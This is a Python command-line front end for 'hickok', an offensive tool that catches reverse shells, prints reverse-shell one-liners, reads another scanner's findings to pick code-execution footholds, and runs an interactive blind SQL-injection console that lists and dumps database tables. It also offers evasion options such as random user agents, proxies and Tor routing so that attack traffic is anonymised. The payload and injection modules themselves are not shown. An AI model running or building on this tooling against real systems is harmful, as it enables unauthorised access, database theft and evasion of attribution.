"""hickok — reverse-shell handler & post-exploitation console."""

from __future__ import annotations

import argparse
import asyncio
import re
import sys
from urllib.parse import parse_qs, urlsplit

from hickok import __version__, findings, http, payloads, sqli
from hickok.console import DIM, THEMES, Console
from hickok.handler import ShellServer

EXAMPLES = """\
examples:
  hickok                                 listen on :9001 and drop into the console
  hickok -l 9001,9002 --lhost 10.10.14.7 multiple listeners, fixed LHOST
  hickok hand                            act on wraith's latest run (found on its own)
  hickok payloads 10.10.14.7 9001        print reverse-shell one-liners
"""

_COMMANDS = {"listen", "hand", "payloads", "eights", "sql"}


class _Help(argparse.RawDescriptionHelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=28, width=86)


def _with_default_command(argv):
    """`hickok` / `hickok -l 9001` default to the `listen` handler."""
    out = list(argv)
    i = 0
    while i < len(out):
        tok = out[i]
        if tok in ("-h", "--help", "--version"):
            return out
        if tok == "--theme":
            i += 2
            continue
        if tok in ("--no-color", "--no-banner"):
            i += 1
            continue
        if tok not in _COMMANDS:
            out.insert(i, "listen")
        return out
    return out


def _console(args) -> Console:
    return Console(
        theme=getattr(args, "theme", None),
        color=False if getattr(args, "no_color", False) else None,
        banner=not getattr(args, "no_banner", False),
        verbose=getattr(args, "verbose", 0),
    )


def cmd_listen(args) -> None:
    c = _console(args)
    c.banner()
    try:
        ports = [int(p) for p in args.listen.split(",")]
    except ValueError:
        raise SystemExit("--listen expects comma-separated port numbers")
    lhost = args.lhost or payloads.guess_lhost()
    server = ShellServer(ports, lhost, c)
    asyncio.run(server.run())


def cmd_payloads(args) -> None:
    c = _console(args)
    lhost = args.lhost or payloads.guess_lhost()
    c.info(f"reverse shells for {lhost}:{args.lport}")
    for name, p in payloads.generate(lhost, args.lport).items():
        c.plain(f"\n  # {name}\n  {p}")
    c.plain("")


def cmd_hand(args) -> None:
    c = _console(args)
    c.banner()
    path = args.file or findings.latest()
    if not path:
        c.bad(f"no wraith run found in {findings.runs_dir()} — run wraith first, "
              "or pass a findings.json (`hickok hand <file>`)")
        raise SystemExit(1)
    if not args.file:
        c.info(f"reading {path}")
    try:
        items = findings.load(path)
    except (OSError, ValueError) as exc:
        c.bad(f"cannot read findings: {exc}")
        raise SystemExit(1)

    c.info(f"{len(items)} finding(s) dealt by wraith")
    c.rule("the table")
    for f in items:
        sev, title, target = f.get("severity", "?"), f.get("title", ""), f.get("target", "")
        mark = c._accent("  ⮕ shell") if findings.is_foothold(title) else ""
        c.plain(f"  [{sev}] {title}  {c._c(DIM, target)}{mark}")

    c.dead_mans_hand(dealt_by_wraith=True)

    foot = findings.footholds(items)
    if foot:
        c.good(f"{len(foot)} foothold(s) — code execution. catch a shell off one:")
        c.plain("      hickok -l 9001          # listener in one terminal")
        for f in foot:
            c.plain(f"      → {f.get('target', '')}")
    else:
        c.warn("no code-execution foothold here — these are leads, not a shell (yet)")


def cmd_eights(args) -> None:
    _console(args).eights()


_SQL_HELP = """  walk the database (boolean-blind):
  banner                DBMS version       user / db        current user / database
  tables                list tables        columns <table>  list a table's columns
  dump <table>          dump its rows      query "<SELECT>"  extract one value
  help                  this               exit             quit
"""


def _sqli_target(items):
    """Pull (url, param) from a wraith SQL-injection finding, if any."""
    for f in items:
        title = (f.get("title") or "")
        if "sql injection" in title.lower():
            m = re.search(r"in '([^']+)'", title)
            if m and f.get("target"):
                return f["target"], m.group(1)
    return None, None


def cmd_sql(args) -> None:
    c = _console(args)
    c.banner()
    url, param, value = args.url, args.param, args.value
    if not url:                                  # fall back to wraith's latest run
        path = findings.latest()
        items = findings.load(path) if path else []
        t, p = _sqli_target(items)
        if t:
            url, param = t, (param or p)
            c.info(f"target from wraith: {p} @ {t}")
    if not url:
        c.bad("need a target — `hickok sql -u 'http://host/page?id=1' [-p id]`")
        raise SystemExit(2)

    q = parse_qs(urlsplit(url).query)
    if not param:
        if len(q) == 1:
            param = next(iter(q))
        else:
            c.bad("which parameter? add `-p <name>`")
            raise SystemExit(2)
    if param in q and args.value == "1":         # take the URL's own value unless overridden
        value = q[param][0]

    # Build the HTTP sender with the operational options (UA, proxy/Tor, …).
    headers = {}
    for h in (args.header or []):
        name, _, val = h.partition(":")
        if val:
            headers[name.strip()] = val.strip()
    ua = args.user_agent or (http.random_agent() if args.random_agent else None)
    try:
        net = http.Http(ua=ua, headers=headers, cookie=args.cookie, proxy=args.proxy,
                        tor=args.tor, delay=args.delay, timeout=args.timeout)
    except http.TorError as exc:
        c.bad(str(exc))
        raise SystemExit(2)

    if args.tor or args.proxy:
        c.info(f"routing through {'Tor' if args.tor else args.proxy}")
    if args.tor:                               # fail closed: never attack if Tor isn't confirmed
        c.info("verifying Tor exit…")
        if not net.check_tor():
            c.bad("Tor not confirmed — aborting before sending attack traffic")
            raise SystemExit(2)
        c.good("Tor confirmed — anonymised")

    p = urlsplit(url)
    c.info(f"injecting '{param}' at {p.scheme}://{p.netloc}{p.path}")
    c.info("calibrating boolean-blind oracle…")
    oracle = sqli.calibrate(net, url, param, value, console=c)
    if oracle is None:
        c.bad("no boolean-blind injection here — try another parameter or value")
        raise SystemExit(1)
    c.good(f"injectable — {oracle.context} context")
    dbms = sqli.fingerprint(oracle)
    prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
    c.good(f"DBMS: {dbms}")

    # Non-interactive (batch) one-shots, else the interactive console.
    if args.banner:
        c.good(sqli.extract_str(oracle, prof, prof["version"]))
    elif args.tables:
        for t in sqli.tables(oracle, prof):
            c.plain(f"  {t}")
    elif args.dump:
        cols = sqli.columns(oracle, prof, args.dump)
        _print_table(c, cols, sqli.dump(oracle, prof, args.dump, cols))
    else:
        _sql_repl(c, oracle, prof)


def _print_table(c, cols, rows) -> None:
    widths = [max(len(cols[i]), *(len(r[i]) for r in rows)) if rows else len(cols[i])
              for i in range(len(cols))]
    c.plain("  " + c._c(DIM, " | ".join(h.ljust(widths[i]) for i, h in enumerate(cols))))
    c.plain("  " + c._c(DIM, "-+-".join("-" * w for w in widths)))
    for r in rows:
        c.plain("  " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(r)))


def _sql_repl(c, oracle, prof) -> None:
    c.plain(_SQL_HELP)
    while True:
        try:
            line = input("hickok(sql)> ").strip()
        except (EOFError, KeyboardInterrupt):
            c.plain("")
            break
        if not line:
            continue
        cmd, _, arg = line.partition(" ")
        cmd, arg = cmd.lower(), arg.strip()
        before = oracle.count
        try:
            if cmd in ("exit", "quit"):
                break
            elif cmd in ("help", "?"):
                c.plain(_SQL_HELP)
                continue
            elif cmd == "banner":
                c.good(sqli.extract_str(oracle, prof, prof["version"]))
            elif cmd in ("user", "current-user"):
                c.good(sqli.extract_str(oracle, prof, prof["user"]) or "(n/a)")
            elif cmd in ("db", "current-db"):
                c.good(sqli.extract_str(oracle, prof, prof["db"]))
            elif cmd == "tables":
                for t in sqli.tables(oracle, prof):
                    c.plain(f"  {t}")
            elif cmd == "columns":
                if not arg:
                    c.warn("usage: columns <table>")
                    continue
                for col in sqli.columns(oracle, prof, arg):
                    c.plain(f"  {col}")
            elif cmd == "dump":
                if not arg:
                    c.warn("usage: dump <table>")
                    continue
                cols = sqli.columns(oracle, prof, arg)
                rows = sqli.dump(oracle, prof, arg, cols)
                _print_table(c, cols, rows)
            elif cmd == "query":
                if not arg:
                    c.warn('usage: query "<SELECT returning one value>"')
                    continue
                if len(arg) >= 2 and arg[0] == arg[-1] and arg[0] in "\"'":
                    arg = arg[1:-1]            # peel one wrapping quote, keep inner ones
                c.good(sqli.extract_str(oracle, prof, arg))
            else:
                c.warn(f"unknown command: {cmd} (type 'help')")
        except Exception as exc:
            c.bad(f"error: {exc}")
        c.plain(c._c(DIM, f"      {oracle.count - before} requests · {oracle.count} total"))



def _output_options() -> argparse.ArgumentParser:
    """Cosmetic options every command understands, shared via parents= so they
    work in any position (`hickok hand f.json --no-color`, not only before it)."""
    op = argparse.ArgumentParser(add_help=False)
    op.add_argument("--theme", metavar="NAME", choices=list(THEMES),
                    help="colour theme: " + " | ".join(THEMES) + " (default: ember)")
    op.add_argument("--no-color", action="store_true", help="disable coloured output")
    op.add_argument("--no-banner", action="store_true", help="suppress the banner")
    return op


def build_parser() -> argparse.ArgumentParser:
    common = _output_options()
    p = argparse.ArgumentParser(
        prog="hickok",
        description="Reverse-shell handler & post-exploitation. The listener is the default: "
                    "`hickok -l PORTS`.",
        epilog=EXAMPLES,
        formatter_class=_Help,
        parents=[common],
    )
    p.add_argument("--version", action="version", version=f"hickok {__version__}")
    sub = p.add_subparsers(dest="command", metavar="<command>")

    ln = sub.add_parser("listen", help="catch reverse shells (default command)",
                        formatter_class=_Help, epilog=EXAMPLES, parents=[common])
    ln.add_argument("-l", "--listen", metavar="PORTS", default="9001",
                    help="comma-separated ports to listen on (default: 9001)")
    ln.add_argument("--lhost", metavar="IP", help="LHOST embedded in generated payloads (auto-detected)")
    ln.set_defaults(func=cmd_listen)

    hd = sub.add_parser("hand", help="act on a wraith findings.json",
                        formatter_class=_Help, parents=[common])
    hd.add_argument("file", nargs="?",
                    help="path to a wraith findings.json (default: wraith's latest run, $WRAITH_RUNS-aware)")
    hd.set_defaults(func=cmd_hand)

    sq = sub.add_parser("sql", help="walk a SQL-injectable parameter (boolean-blind)",
                        formatter_class=_Help, parents=[common])
    sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
    sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
    sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
    sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
                    help="-v 2 prints every injected payload")
    ev = sq.add_argument_group("evasion / opsec")
    ev.add_argument("--random-agent", action="store_true", help="use a random real browser User-Agent")
    ev.add_argument("-A", "--user-agent", metavar="UA", help="explicit User-Agent")
    ev.add_argument("-H", "--header", action="append", metavar="'K: V'", help="extra header (repeatable)")
    ev.add_argument("--cookie", metavar="STR", help="Cookie header (for authenticated injection)")
    ev.add_argument("--proxy", metavar="URL", help="http://host:port or socks5h://host:port")
    ev.add_argument("--tor", action="store_true",
                    help="route via Tor (socks5h://127.0.0.1:9050), verified — fails closed")
    ev.add_argument("--delay", metavar="SEC", type=float, default=0.0, help="seconds between requests")
    ev.add_argument("--timeout", metavar="SEC", type=float, default=15.0, help="per-request timeout")
    bt = sq.add_argument_group("non-interactive (run one action and exit)")
    bt.add_argument("--banner", action="store_true", help="print the DBMS version")
    bt.add_argument("--tables", action="store_true", help="list tables")
    bt.add_argument("--dump", metavar="TABLE", help="dump a table")
    sq.set_defaults(func=cmd_sql)

    pl = sub.add_parser("payloads", help="print reverse-shell one-liners",
                        formatter_class=_Help, parents=[common])
    pl.add_argument("lhost", nargs="?", help="LHOST (auto-detected if omitted)")
    pl.add_argument("lport", nargs="?", type=int, default=9001, help="LPORT (default: 9001)")
    pl.set_defaults(func=cmd_payloads)

    egg = sub.add_parser("eights", parents=[common])   # easter egg: no help= keeps it out
    egg.set_defaults(func=cmd_eights)
    return p


def main(argv=None) -> None:
    argv = sys.argv[1:] if argv is None else list(argv)
    parser = build_parser()
    if not argv:
        Console().banner()
        parser.print_help()
        return
    args = parser.parse_args(_with_default_command(argv))
    if not hasattr(args, "func"):
        parser.print_help()
        return
    try:
        args.func(args)
    except KeyboardInterrupt:
        print("\n  [-] interrupted", file=sys.stderr)
        sys.exit(130)


if __name__ == "__main__":
    main()
